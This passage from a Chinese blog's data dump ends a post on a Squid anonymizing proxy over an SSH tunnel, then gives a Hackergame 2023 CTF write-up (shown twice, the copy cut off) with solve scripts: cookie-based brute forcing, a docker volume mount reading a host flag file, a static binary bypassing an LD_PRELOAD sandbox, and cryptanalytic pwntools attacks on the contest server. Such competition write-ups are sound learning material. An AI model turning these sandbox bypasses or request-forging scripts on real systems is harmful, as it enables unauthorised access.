CONNECT !SSL_ports</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 允许来自本地的请求</span></span><br><span class=\"line\">http_access allow localhost</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 拒绝所有请求，最后兜底的规则</span></span><br><span class=\"line\">http_access deny all</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 端口设为 3128</span></span><br><span class=\"line\">http_port 3128</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 高匿代理配置</span></span><br><span class=\"line\">request_header_access Via deny all</span><br><span class=\"line\">request_header_access X-Forwarded-For deny all</span><br><span class=\"line\">request_header_access From deny all</span><br></pre></td></tr></table></figure>\n\n<p>然后 <code>sudo systemctl restart squid</code>，要等上一会，我应该等了差不多半分钟。</p>\n<p>然后我端口转发搞了一天，失败得莫名其妙的，最终就直接用 VSCode SSH 后自带的端口转发顶着先了。</p>\n<p>更新：后来用 SSH 的端口转发了，命令如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -N -L 0.0.0.0:55555:localhost:3128 &lt;your-azure&gt;</span><br></pre></td></tr></table></figure>\n\n<p>这样就可以在本地的 55555 端口访问到远程的 3128 端口了，<code>0.0.0.0</code> 是想给同一局域网的其他机子接，不需要的话可以只写端口，<code>-N</code> 意思是不启动远程 shell，如果你希望在后台运行可以再加个 <code>-f</code>。<br>但是这样不够优雅，就再搞了个 systemd 的服务，配置如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># /etc/systemd/system/ssh-tunnel.service</span></span><br><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=SSH tunnel service</span><br><span class=\"line\">After=network.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">ExecStart=/usr/bin/ssh ssh -N -L 0.0.0.0:55555:localhost:3128 &lt;your-azure&gt;</span><br><span class=\"line\">User=&lt;你的用户名&gt;</span><br><span class=\"line\">Restart=always</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>\n\n<p>然后 <code>sudo systemctl daemon-reload</code> 一下，再 <code>sudo systemctl start ssh-tunnel</code> 就行了，<code>sudo systemctl enable ssh-tunnel</code> 可以设置开机自启。</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/562014043\">https://zhuanlan.zhihu.com/p/562014043</a></li>\n</ul>"},{"title":"Hackergame 2023 writeups","date":"2023-11-04T18:32:00.000Z","_content":"\n打 Hackergame 的第三年。\n<!--more-->\n## Summary\n\n又是一年 Hackergame，今年终于进了一次前 100，总排 72，math 榜也能看到我。\n开赛的时候在东校参加迎新大会，校巴的上车点和下车点竟然是不一样的，没坐上回去的车，最后还得自己买高铁，要是校巴还报销不了的话是真的想似了。\nGZTime 还是直线上分，每年的保留节目了属于是。ZRHan 也打到了第 9，我校首次在 hg 前十里占两席。mcfx 也又 AK 了，现在的我没以前那么菜了，才更觉得他的数学水平简直不像人，甚至有种比春哥还强一大截的感觉，有空得翻翻他 blog，看看能不能淘到点什么。\n打到一半的时候我实在受不了这一天比一天卡的电脑了，就重装了一下系统，这下啥环境都没了，装 sagemath 也装了半天，好在最后装好了，但也因此几乎停止了上分。\n\n********************************\n\n## 签到\n\n虽然做了两年签到的我大概也能猜到什么套路，但还是玩了一下。\n要求喊出 \"Hackergame 启动！\" 并且相似度要达到 99.9% 才能拿到 flag，直接随便意思一句点提交，url 出现 `?similarity=77.5930335706637`，直接改成 100，回车。\n点击获取 flag，然后我屏幕就白了，然后。。。见白知原好吧。\n\n## 猫咪小测\n\n1. 想要借阅世界图书出版公司出版的《A Classical Introduction To Modern Number Theory 2nd ed.》，应当前往中国科学技术大学西区图书馆的哪一层？（30 分）\n手动爆破，12 层，还挺高。\n\n2. 今年 arXiv 网站的天体物理版块上有人发表了一篇关于「可观测宇宙中的鸡的密度上限」的论文，请问论文中作者计算出的鸡密度函数的上限为 10 的多少次方每立方秒差距？（30 分）\n提示：是一个非负整数。\n脚本爆破，代码如下：\n\n    ```python\n    import requests as r\n    import re\n    from tqdm import tqdm\n\n    def crack(q2):\n        url = 'http://202.38.93.111:10001/'\n        payload = {'q1': '12', 'q2': q2,\n                'q3': '12', 'q4': 0}\n        headers = {'Cookie': 'session=eyJ0b2tlbiI6IjcxNDpNRVVDSUMwTFByNHBrS3QyQmwrU3dCQUpVbE1wdldmRU1wSzIyeTcxYzVxV3diTmFBaUVBcXVUYTFxS3kxYXdYOGxnc0lBOExtK215NEZ1RlB3SEVvM053cnJXZGJlND0ifQ.ZT3Olw.PIfDty1-kKuL1PSgMf8Et1GIJv4'}\n        res = r.post(url, headers=headers, data=payload).text\n        pat = re.compile(r'(\\d+)。')\n        score = re.findall(pat, res)\n        return int(score[0])\n\n    for i in range(100):\n        res = crack(str(i))\n        if res == 60:\n            print(i)\n            break\n    ```\n\n3. 为了支持 TCP BBR 拥塞控制算法，在编译 Linux 内核时应该配置好哪一条内核选项？（20 分）\n提示：输入格式为 CONFIG_XXXXX，如 CONFIG_SCHED_SMT。\n问一下 GPT 就行，直接就出 `CONFIG_TCP_CONG_BBR` 了。\n\n4. 🥒🥒🥒：「我……从没觉得写类型标注有意思过」。在一篇论文中，作者给出了能够让 Python 的类型检查器 MyPY mypy 陷入死循环的代码，并证明 Python 的类型检查和停机问题一样困难。请问这篇论文发表在今年的哪个学术会议上？（20 分）\n提示：会议的大写英文简称，比如 ISCA、CCS、ICML。\n搜一下就有，找到 Python Type Hints are Turing Complete 这篇文章，在 ECOOP 发表。\n\n## 更深更暗\n\n水题，F12，随便展开一下元素就找到 flag 了。\n\n## 旅行照片 3.0\n\n可以直接看官方 wp。学长晚上的行程注意看脖子上带子的文字就行。\n\n## 赛博井字棋\n\n霸道的力量，用 hackerbar 下到人机下过的位置就行。\n\n## 奶奶的睡前 flag 故事\n\n截图漏洞，之前见过 Windows 的，谷歌的亲儿子手机就是 Pixel，直接搜 Pixel screenshot hack 就行了。找到网站，手机型号选择最新的不行，换个老点的就可以了。\n\n## 组委会模拟器\n\nF12 看下请求，发现会先拿到全部 1000 条消息，包含消息 id、内容和时间，点击消息会发消息的 id 到服务端，这样的话我们用 python 直接梭就行了。\n注意要按时间发包，不然会返回“发生了时空穿越”的失败提示。\n\n```python\nimport time\nimport requests as r\nimport json\nimport re\nfrom tqdm import tqdm\n\nurl = 'http://202.38.93.111:10021/api/getMessages'\nheaders = {'Cookie': <cookie>}\nres = r.post(url, headers=headers).text\n\n\ndef delmsg(idd):\n    url = 'http://202.38.93.111:10021/api/deleteMessage'\n    headers = {'Cookie': <cookie>,\n               'Content-Type': 'application/json',}\n    data = {'id': idd}\n    res = r.post(url, headers=headers, data=json.dumps(data)).text\n    res = json.loads(res)\n    if res['success'] == True:\n        return True\n    return res['error']\nstart_time = time.time()\n\njs = json.loads(res)\nmsg = js['messages']\nmsg = list(msg)\n\nfor m in msg:\n    pat = re.compile(r'hack\\[[a-z]+\\]')\n    flag = re.search(pat, m['text'])\n    if flag:\n        m['flag'] = True\n    else:\n        m['flag'] = False\n\n# with open('output.txt', 'w+') as f:\n#     for m in msg:\n#         f.write(f\"{m['flag']} {m['text']}\\n\")\n\nfor i in tqdm(range(len(msg))):\n    txt = msg[i]['text']\n    delay = msg[i]['delay']\n    \n    while True:\n        current_time = time.time() - start_time\n        if current_time > delay:\n            if msg[i]['flag']:\n                res = delmsg(i)\n                if res != True:\n                    print(txt)\n                    print(res)\n                break  # 添加退出条件\n            else:\n                break  # 添加退出条件\n\nurl = 'http://202.38.93.111:10021/api/getflag'\nres = r.post(url, headers=headers).text\n\nprint(json.loads(res))\n```\n\n## 虫\n\nSSTV，在 github 找个 [Decoder](https://github.com/colaclanth/sstv) 就行，舍友还在那播放，太折磨了（）。\n\n## JSON ⊂ YAML?\n\n第一问 GPT 给出的答案五花八门，但是都不行，最后还是去找了文档一个个试试出来的浮点数可以触发。\n第二问 GPT 倒是好使，直接说两个相同的 key 会触发。\n两个 payload 分别是 `{\"null\": -2E+05}` 和 `{\"null\": \"yes\",\"null\":\"no\"}`。\n\n## Git? Git 叹号\n\n（标题直接打 ！的话 markdown 报错，看着难受）\n问了 GPT，让我用 `reflog`，如下：\n\n```bash\n$ git reflog\nea49f0c (HEAD -> main) HEAD@{0}: commit: Trim trailing spaces\n15fd0a1 (origin/main, origin/HEAD) HEAD@{1}: reset: moving to HEAD~\n505e1a3 HEAD@{2}: commit: Trim trailing spaces\n15fd0a1 (origin/main, origin/HEAD) HEAD@{3}: clone: from https://github.com/dair-ai/ML-Course-Notes.git\n```\n\n可以看到，15fd0a1 是撤销的操作，我们用 `diff` 看一下修改了什么就行了：\n\n```bash\ngit diff 505e1a3 15fd0a1 --patch\n```\n\n## HTTP 集邮册\n\n前面两问胡乱试几下就有了。\n最后一问没搞出来。\n\n## Docker for Everyone\n\n告诉一下 GPT 可以执行 `docker` 命令，就给出 payload 了\n\n```bash\ndocker run -v /dev/shm:/dev/shm --rm -it alpine cat /dev/shm/flag\n```\n\n还解释得挺详细：\n\n> 在这个命令中：\ndocker run 是用来创建并运行一个新容器的命令。\n-v /dev/shm:/dev/shm 是一个卷参数，它将主机上的/dev/shm目录挂载到容器的/dev/shm目录。\n--rm 是一个选项，它会在容器退出时删除容器，以避免留下任何残留数据。\n-it 是一个选项，它会为容器提供一个交互式终端。\nalpine 是你想要运行的容器镜像的名称。\ncat /dev/shm/flag 是你想在容器内运行的命令，它会尝试读取并输出/dev/shm/flag的内容。\n\n## 惜字如金 2.0\n\n手调即可。\n\n```python\n# Th siz of th fil may reduc after XZRJification\n\ndef check_equals(left, right):\n    # check whether left == right or not\n    if left != right: raise ValueError\n\ndef get_code_dict():\n    # prepar th cod dict\n    code_dict = []\n    code_dict += ['nymeh1niwemflcir}echaet0']   # 0-23\n    code_dict += ['a3g7}kidgojernoetlsup?h0']   # 24-47\n    code_dict += ['uulw!f5soadrhwnrsnstnoeq']   # 48-71\n    code_dict += ['ct.{l-findiehaai{oveatas']   # 72-95\n    code_dict += ['ty9kxborszst.guyd?!blm-p']   # 96-119\n    # print(len(code_dict[0]))\n    # print(set(len(s) for s in code_dict))\n    check_equals(set(len(s) for s in code_dict), {24})\n    return ''.join(code_dict)\n\ndef decrypt_data(input_codes):\n    # retriev th decrypted data\n    code_dict = get_code_dict()\n    output_chars = [code_dict[c] for c in input_codes]\n    return ''.join(output_chars)\n\nif __name__ == '__main__':\n    # check som obvious things\n    check_equals('creat', 'cre' + 'at')\n    check_equals('referrer', 'refer' + 'rer')\n    # check th flag\n    flag = decrypt_data([53, 41, 85, 109, 75, 1, 33, 48, 77, 90,\n                         17, 118, 36, 25, 13, 89, 90, 3, 63, 25,\n                         31, 77, 27, 60, 3, 118, 24, 62, 54, 61,\n                         25, 63, 77, 36, 5, 32, 60, 67, 113, 28])\n    print(flag)\n    check_equals(flag.index('flag{'), 0)\n    check_equals(flag.index('}'), len(flag) - 1)\n    # print th flag\n    # print(flag)\n\n```\n\n## 高频率星球\n\n发现原来不装 asciinema 也能玩，一点点用 Ctrl + H 把 ANSI 转义字符删掉就行了。\n\n## 小型大语言模型星球\n\n第一问直接问 `Am I smart?` 就能套出话来了。\n第二问已经重装系统了，本地模型都跑不起来，就懒得爆了。\n\n## 低带宽星球\n\n第一问随便压缩一下就行。\n第二问应该是要手造了，懒得造了。\n\n## 为什么要打开 /flag 😡\n\n第一问还是 GPT 给出的：\n\n>绕过 LD_PRELOAD 注入的共享对象可以比较困难，因为这是一种强大的机制，它允许开发者或系统管理员在运行时更改动态链接的行为。在安全相关的场景或者 Capture The Flag (CTF) 类型的比赛中，绕过这样的限制通常需要一些创造性的方法和对系统工作方式的深刻理解。\n在给定的上下文中，LD_PRELOAD 用于注入一个共享库（lib.so），这个共享库通过各种方法拦截和更改了文件操作、执行新程序的系统调用。以下是一些可能的绕过策略：\n    1. 使用静态链接的二进制：\n    如果可行的话，使用一个静态链接的二进制文件可以避免 LD_PRELOAD 的影响，因为静态链接的程序不会使用动态链接库。\n    ...\n\n想静态编译的话在编译的时候加个 `-static` 就行了。程序也是 GPT 写的：\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n\nint main() {\n    FILE *file;\n    char *line = NULL;\n    size_t len = 0;\n    ssize_t read;\n\n    // 打开 /flag 文件\n    file = fopen(\"/flag\", \"r\");\n    if (file == NULL) {\n        perror(\"无法打开文件 /flag\");\n        return EXIT_FAILURE;\n    }\n\n    // 读取并打印 /flag 文件的内容\n    while ((read = getline(&line, &len, file)) != -1) {\n        printf(\"%s\", line);\n    }\n\n    // 释放资源并关闭文件\n    free(line);\n    fclose(file);\n\n    return EXIT_SUCCESS;\n}\n```\n\n## 黑客马拉松\n\n做的时候就感觉铁定非预期了，但是令人迷惑的是这才是最自然的思路，那非预期是不是算预期呢（）。\n说起来还是第二问给我的解题思路，看第一问看了半天发现第二问更简单，分数也是第二问更低，说明出题人是知道的，这样的题目顺序真是居心叵测。\n第二问直接取 $e = -1 \\mod \\varphi(N)$ 就过了。\n第一问严格点，还是这么取的话会触发 small loop，因为 $(-1)^2=1$ 嘛，所以取 $e = -3 \\mod \\varphi(N)$ 就行了。\n两问都是二元 coppersmith 的形式。\n\n```python\nfrom sage.all import *\nfrom pwn import *\n\nr = remote('202.38.93.111', 20230)\n\nimport itertools\n \ndef small_roots(f, bounds, m=1, d=None):\n    if not d:\n        d = f.degree()\n \n    R = f.base_ring()\n    N = R.cardinality()\n    \n    f /= f.coefficients().pop(0)\n    f = f.change_ring(ZZ)\n \n    G = Sequence([], f.parent())\n    for i in range(m+1):\n        base = N**(m-i) * f**i\n        for shifts in itertools.product(range(d), repeat=f.nvariables()):\n            g = base * prod(map(power, f.variables(), shifts))\n            G.append(g)\n \n    B, monomials = G.coefficient_matrix()\n    monomials = vector(monomials)\n \n    factors = [monomial(*bounds) for monomial in monomials]\n    for i, factor in enumerate(factors):\n        B.rescale_col(i, factor)\n \n    B = B.dense_matrix().LLL()\n \n    B = B.change_ring(QQ)\n    for i, factor in enumerate(factors):\n        B.rescale_col(i, 1/factor)\n \n    H = Sequence([], f.parent().change_ring(QQ))\n    for h in filter(None, B*monomials):\n        H.append(h)\n        I = H.ideal()\n        if I.dimension() == -1:\n            H.pop()\n        elif I.dimension() == 0:\n            roots = []\n            for root in I.variety(ring=ZZ):\n                root = tuple(R(root[var]) for var in f.variables())\n                roots.append(root)\n            return roots\n    return []\n\n# context.log_level = 'debug'\n\np = 20888518302262822708640092467070098180239940282964311580846713529915991035084176547285976560408772270176488335531054066899663135571600859126844374032782889\nlfp = 641940332996671520364775722844731269161\nq = 6214251232316644767865593529639904703813556510242875683726437167720285962376267466666131377504429682587986680767643437843442269652671382746406944152412577\nlfq = 381239571907162860348261198437277761621\n\nphi = (p - 1) * (q - 1)\ne = phi - 1\n\ntoken = <token>\nr.sendlineafter(b'Please input your token:', token.encode())\nr.sendlineafter(b'p:', str(p).encode())\nr.sendlineafter(b'q:', str(q).encode())\nr.sendlineafter(b'A large prime factor of p-1: ', str(lfp).encode())\nr.sendlineafter(b'A large prime factor of q-1: ', str(lfq).encode())\nr.sendlineafter(b'e:', str(e).encode())\nr.sendlineafter(b'Choose mission: ', b'2')\n\nbl = eval(r.recvline().decode().strip())[0]\n\nn = p*q\nPR = PolynomialRing(Zmod(n), names=('a', 'bh'))\n(a, bh) = PR._first_ngens(2)\nf = a * (bh * 2**928 + bl) - 1\n\nsol = small_roots(f, [2**96, 2**96], d=2)\n\n_, bh = sol[0]\nb = (bh * 2**928 + bl) % n\nprint(b)\nr.sendlineafter(b'Predict PRNG state: ', str(b).encode())\nflag = r.recvline().decode().strip()\nsuccess(flag)\nr.close()\n\n```\n\n## 不可加密的异世界 2\n\n关键就是在 GF(257) 里运算后结果还模了 256，所以有一些 256 变成了 0 返回。那么我们看到的 0 就不知道它原来是 0 还是 256 了。\n观察字符的规律，可以发现 ascii 码的最高位一定为 0，那么就可以用异或制造相差 128 的两轮差分，这时候能还原矩阵的大部分，少部分没还原是因为上面的原因。\n这时候如果拿到的向量含 0，就可以用次高位来继续拿一组进行修复，因为我们拿到了向量的大部分，所以可以分别假设次高位为 0 和 1，然后和已知向量进行比较，最像的那个就是正确的。\n这时候基本有一半左右概率还原了，我们可以算一下概率，上面方法出错的可能只会是因为三组向量中有两个 0 同时出现在一个位置或者三 0 合一（极品情况）。对任一元素，三次都不是 0 或者只出一次 0 的概率为 $(\\frac{255}{256})^3 + 3 \\times \\frac{1}{256} \\times (\\frac{255}{256})^2 = \\frac{8388225}{8388608}$，即出现问题的概率为 $\\frac{383}{8388608}$，然而即使出了问题，我们也有一半的概率直接猜对（默认猜 0 原本就是 0），所以单个元素出错概率为 $\\frac{383}{16777216}$，正确概率为 $\\frac{16776833}{16777216}$，那么 128*128=16384 个元素全部正确的概率为 $(\\frac{16776833}{16777216})^{16384}\\approx 0.687957850470333$。\n当然如果觉得还不够爽可以像我一样再抽一发修正，这样基本很接近 100% 了。\n第二问直接求个特征向量，第三问再套个 CVP，此时维数比较大，LLL 的结果不够理想，需要用 BKZ。\n\n```python\nfrom Crypto.Util.number import *\nfrom pwn import *\nfrom sage.all import *\nfrom tqdm import tqdm\n\nr = remote('202.38.93.111', 22000)\n\ntoken = <token>\nr.sendlineafter(b'Please input your token:', token.encode())\n\ntimes = 0\n\ndef enc(m):\n    global times\n    times += 1\n    r.sendlineafter(b'>', m.encode())\n    r.recvuntil(b'you ciphertext : ')\n    cipher = r.readline().decode().strip()\n    return cipher\n\ndef getvec(i, num='00'):\n    return '11'*i + num + '11'*(128-i-1)\n\ndef getzero(vec):\n    return [i for i in range(128) if vec[i] == 0]\n\ndef bit_recover(b1, b2, diff):\n    return (b1 - b2)*pow(diff, -1, 257) % 257\n\ndef vec_recover(v1, v2, diff):\n    return [bit_recover(b1, b2, diff) for b1, b2 in zip(v1, v2)]\n\n\ndef diff_attack(idx):\n    # suppose xorflag = '00000000'\n    xorflag = 0\n    c00 = bytes.fromhex(enc(getvec(idx, '00')))\n    c80 = bytes.fromhex(enc(getvec(idx, '80')))\n    most = vec_recover(c80, c00, 0x80)\n    zero00 = getzero(c00)\n    zero80 = getzero(c80)\n    # if no zero in c00 and c80, then most is correct\n    if len(zero00+zero80) == 0:\n        return most\n    zero0080 = list(set(zero00) & set(zero80))\n    for i in zero0080:\n        # remove the zero in zero00 and zero80, they will be patched later\n        zero00.remove(i)\n        zero80.remove(i)\n    c40 = bytes.fromhex(enc(getvec(idx, '40')))\n    zero40 = getzero(c40)\n    k40 = vec_recover(c40, c00, -0x40)\n    k41 = vec_recover(c40, c00, 0x40)\n    if abs(norm(vector(ZZ, most)-vector(ZZ, k40))) < abs(norm(vector(ZZ, most)-vector(ZZ, k41))):\n        xorflag ^= 0x40\n    zero0040 = []\n    zero4080 = []\n    for i in zero00:\n        if i in zero40:\n            zero0040.append(i)\n            continue\n        most[i] = bit_recover(c80[i], c40[i], (xorflag^0x80)-(xorflag^0x40))\n    for i in zero80:\n        if i in zero40:\n            zero4080.append(i)\n            continue\n        most[i] = bit_recover(c40[i], c00[i], (xorflag^0x40)-xorflag)\n    if len(zero0040+zero4080+zero0080) == 0:\n        return most\n    c20 = bytes.fromhex(enc(getvec(idx, '20')))\n    k20 = vec_recover(c20, c00, 0x20)\n    k21 = vec_recover(c20, c00, -0x20)\n    if abs(norm(vector(ZZ, most)-vector(ZZ, k20))) > abs(norm(vector(ZZ, most)-vector(ZZ, k21))):\n        xorflag ^= 0x20\n    for i in zero0040:\n        most[i] = bit_recover(c80[i], c20[i], (xorflag^0x80)-(xorflag^0x20))\n    for i in zero4080:\n        most[i] = bit_recover(c20[i], c00[i], (xorflag^0x20)-xorflag)\n    for i in zero0080:\n        most[i] = bit_recover(c40[i], c20[i], (xorflag^0x40)-(xorflag^0x20))\n    return most\n    \nm = []\n\nfor i in tqdm(range(128)):\n    m.append(diff_attack(i))\nsuccess('recover key in {} times'.format(times))\n\nc = bytes.fromhex(enc('0'*255+'1'))\nM = matrix(GF(257), m).transpose()\nresult = (M**(-1)) * vector(GF(257), list(c))\nflag = ''.join([chr(int(i)) for i in result])\nflag1 = flag.split('\\n')[0]\nsuccess('flag1: '+flag1)\n\n# V = (M - matrix.identity(128)).right_kernel().basis_matrix()\n# v = V[0]\n# print(v)\n# v = bytes(v)\n# v = hex(bytes_to_long(v))[2:].zfill(256)\n# print(v,len(v))\n# r.sendlineafter(b'>', v.encode())\n\ndef cvp(M, v, d=2**10, mothod='BKZ'):\n    p = M.base_ring().characteristic()\n    M = M.change_ring(ZZ)\n    v = v.change_ring(ZZ)\n    M = M.stack(matrix.identity(M.ncols())*p)\n    M = M.stack(-v)\n    M = M.augment(vector(ZZ, [0]*(M.nrows()-1)+[d]))\n    if mothod == 'LLL':\n        M = M.LLL()\n    else:\n        M = M.BKZ()\n    vv = vector(ZZ, M[-1][:-1])\n    return vv+v\n\nZ = (M - matrix.identity(128)).right_kernel().basis_matrix()\nv = cvp(Z, vector(ZZ, [0x50]*128))\nv = hex(bytes_to_long(bytes(list(v))))[2:].zfill(256)\n\nr.sendlineafter(b'>', v.encode())\n\nr.recvuntil(b'[+] unbelievable !!! You are an excellent hacker!\\n')\nflag2 = r.readline().decode().strip()\nsuccess('flag2: '+flag2)\n\nr.recvuntil(b'[+] how can you find such an exquisite solution?\\n')\nflag3 = r.readline().decode().strip()\nsuccess('flag3: '+flag3)\n\nr.close()\n```\n","source":"_posts/Hackergame2023-writeups.md","raw":"---\ntitle: Hackergame 2023 writeups\ndate: 2023-11-05 02:32:00\ntags: CTF\ncategories: 题解\n---\n\n打 Hackergame 的第三年。\n<!--more-->\n## Summary\n\n又是一年 Hackergame，今年终于进了一次前 100，总排 72，math 榜也能看到我。\n开赛的时候在东校参加迎新大会，校巴的上车点和下车点竟然是不一样的，没坐上回去的车，最后还得自己买高铁，要是校巴还报销不了的话是真的想似了。\nGZTime 还是直线上分，每年的保留节目了属于是。ZRHan 也打到了第 9，我校首次在 hg 前十里占两席。mcfx 也又 AK 了，现在的我没以前那么菜了，才更觉得他的数学水平简直不像人，甚至有种比春哥还强一大截的感觉，有空得翻翻他 blog，看看能不能淘到点什么。\n打到一半的时候我实在受不了这一天比一天卡的电脑了，就重装了一下系统，这下啥环境都没了，装 sagemath 也装了半天，好在最后装好了，但也因此几乎停止了上分。\n\n********************************\n\n## 签到\n\n虽然做了两年签到的我大概也能猜到什么套路，但还是玩了一下。\n要求喊出 \"Hackergame 启动！\" 并且相似度要达到 99.9% 才能拿到 flag，直接随便意思一句点提交，url 出现 `?similarity=77.5930335706637`，直接改成 100，回车。\n点击获取 flag，然后我屏幕就白了，然后。。。见白知原好吧。\n\n## 猫咪小测\n\n1. 想要借阅世界图书出版公司出版的《A Classical Introduction To Modern Number Theory 2nd ed.》，应当前往中国科学技术大学西区图书馆的哪一层？（30 分）\n手动爆破，12 层，还挺高。\n\n2. 今年 arXiv 网站的天体物理版块上有人发表了一篇关于「可观测宇宙中的鸡的密度上限」的论文，请问论文中作者计算出的鸡密度函数的上限为 10 的多少次方每立方秒差距？（30 分）\n提示：是一个非负整数。\n脚本爆破，代码如下：\n\n    ```python\n    import requests as r\n    import re\n    from tqdm import tqdm\n\n    def crack(q2):\n        url = 'http://202.38.93.111:10001/'\n        payload = {'q1': '12', 'q2': q2,\n                'q3': '12', 'q4': 0}\n        headers = {'Cookie': 'session=eyJ0b2tlbiI6IjcxNDpNRVVDSUMwTFByNHBrS3QyQmwrU3dCQUpVbE1wdldmRU1wSzIyeTcxYzVxV3diTmFBaUVBcXVUYTFxS3kxYXdYOGxnc0lBOExtK215NEZ1RlB3SEVvM053cnJXZGJlND0ifQ.ZT3Olw.PIfDty1-kKuL1PSgMf8Et1GIJv4'}\n        res = r.post(url, headers=headers, data=payload).text\n        pat = re.compile(r'(\\d+)。')\n        score = re.findall(pat, res)\n        return int(score[0])\n\n    for i in range(100):\n        res = crack(str(i))\n        if res == 60:\n            print(i)\n            break\n    ```\n\n3. 为了支持 TCP BBR 拥塞控制算法，在编译 Linux 内核时应该配置好哪一条内核选项？（20 分）\n提示：输入格式为 CONFIG_XXXXX，如 CONFIG_SCHED_SMT。\n问一下 GPT 就行，直接就出 `CONFIG_TCP_CONG_BBR` 了。\n\n4. 🥒🥒🥒：「我……从没觉得写类型标注有意思过」。在一篇论文中，作者给出了能够让 Python 的类型检查器 MyPY mypy 陷入死循环的代码，并证明 Python 的类型检查和停机问题一样困难。请问这篇论文发表在今年的哪个学术会议上？（20 分）\n提示：会议的大写英文简称，比如 ISCA、CCS、ICML。\n搜一下就有，找到 Python Type Hints are Turing Complete 这篇文章，在 ECOOP 发表。\n\n## 更深更暗\n\n水题，F12，随便展开一下元素就找到 flag 了。\n\n## 旅行照片 3.0\n\n可以直接看官方 wp。学长晚上的行程注意看脖子上带子的文字就行。\n\n## 赛博井字棋\n\n霸道的力量，用 hackerbar 下到人机下过的位置就行。\n\n## 奶奶的睡前 flag 故事\n\n截图漏洞，之前见过 Windows 的，谷歌的亲儿子手机就是 Pixel，直接搜 Pixel screenshot hack 就行了。找到网站，手机型号选择最新的不行，换个老点的就可以了。\n\n## 组委会模拟器\n\nF12 看下请求，发现会先拿到全部 1000 条消息，包含消息 id、内容和时间，点击消息会发消息的 id 到服务端，这样的话我们用 python 直接梭就行了。\n注意要按时间发包，不然会返回“发生了时空穿越”的失败提示。\n\n```python\nimport time\nimport requests as r\nimport json\nimport re\nfrom tqdm import tqdm\n\nurl = 'http://202.38.93.111:10021/api/getMessages'\nheaders = {'Cookie': <cookie>}\nres = r.post(url, headers=headers).text\n\n\ndef delmsg(idd):\n    url = 'http://202.38.93.111:10021/api/deleteMessage'\n    headers = {'Cookie': <cookie>,\n               'Content-Type': 'application/json',}\n    data = {'id': idd}\n    res = r.post(url, headers=headers, data=json.dumps(data)).text\n    res = json.loads(res)\n    if res['success'] == True:\n        return True\n    return res['error']\nstart_time = time.time()\n\njs = json.loads(res)\nmsg = js['messages']\nmsg = list(msg)\n\nfor m in msg:\n    pat = re.compile(r'hack\\[[a-z]+\\]')\n    flag = re.search(pat, m['text'])\n    if flag:\n        m['flag'] = True\n    else:\n        m['flag'] = False\n\n# with open('output.txt', 'w+') as f:\n#     for m in msg:\n#         f.write(f\"{m['flag']} {m['text']}\\n\")\n\nfor i in tqdm(range(len(msg))):\n    txt = msg[i]['text']\n    delay = msg[i]['delay']\n    \n    while True:\n        current_time = time.time() - start_time\n        if current_time > delay:\n            if msg[i]['flag']:\n                res = delmsg(i)\n                if res != True:\n                    print(txt)\n                    print(res)\n                break  # 添加退出条件\n            else:\n                break  # 添加退出条件\n\nurl = 'http://202.38.93.111:10021/api/getflag'\nres = r.post(url, headers=headers).text\n\nprint(json.loads(res))\n```\n\n## 虫\n\nSSTV，在 github 找个 [Decoder](https://github.com/colaclanth/sstv) 就行，舍友还在那播放，太折磨了（）。\n\n## JSON ⊂ YAML?\n\n第一问 GPT 给出的答案五花八门，但是都不行，最后还是去找了文档一个个试试出来的浮点数可以触发。\n第二问 GPT 倒是好使，直接说两个相同的 key 会触发。\n两个 payload 分别是 `{\"null\": -2E+05}` 和 `{\"null\": \"yes\",\"null\":\"no\"}`。\n\n## Git? Git 叹号\n\n（标题直接打 ！的话 markdown 报错，看着难受）\n问了 GPT，让我用 `reflog`，如下：\n\n```bash\n$ git reflog\nea49f0c (HEAD -> main) HEAD@{0}: commit: Trim trailing spaces\n15fd0a1 (origin/main, origin/HEAD) HEAD@{1}: reset: moving to HEAD~\n505e1a3 HEAD@{2}: commit: Trim trailing spaces\n15fd0a1 (origin/main, origin/HEAD) HEAD@{3}: clone: from https://github.com/dair-ai/ML-Course-Notes.git\n```\n\n可以看到，15fd0a1 是撤销的操作，我们用 `diff` 看一下修改了什么就行了：\n\n```bash\ngit diff 505e1a3 15fd0a1 --patch\n```\n\n## HTTP 集邮册\n\n前面两问胡乱试几下就有了。\n最后一问没搞出来。\n\n## Docker for Everyone\n\n告诉一下 GPT 可以执行 `docker` 命令，就给出 payload 了\n\n```bash\ndocker run -v /dev/shm:/dev/shm --rm -it alpine cat /dev/shm/flag\n```\n\n还解释得挺详细：\n\n> 在这个命令中：\ndocker run 是用来创建并运行一个新容器的命令。\n-v /dev/shm:/dev/shm 是一个卷参数，它将主机上的/dev/shm目录挂载到容器的/dev/shm目录。\n--rm 是一个选项，它会在容器退出时删除容器，以避免留下任何残留数据。\n-it 是一个选项，它会为容器提供一个交互式终端。\nalpine 是你想要运行的容器镜像的名称。\ncat /dev/shm/flag 是你想在容器内运行的命令，它会尝试读取并输出/dev/shm/flag的内容。\n\n## 惜字如金 2.0\n\n手调即可。\n\n```python\n# Th siz of th fil may reduc after XZRJification\n\ndef check_equals(left, right):\n    # check whether left == right or not\n    if left != right: raise ValueError\n\ndef get_code_dict():\n    # prepar th cod dict\n    code_dict = []\n    code_dict += ['nymeh1niwemflcir}echaet0']   # 0-23\n    code_dict += ['a3g7}kidgojernoetlsup?h0']   # 24-47\n    code_dict += 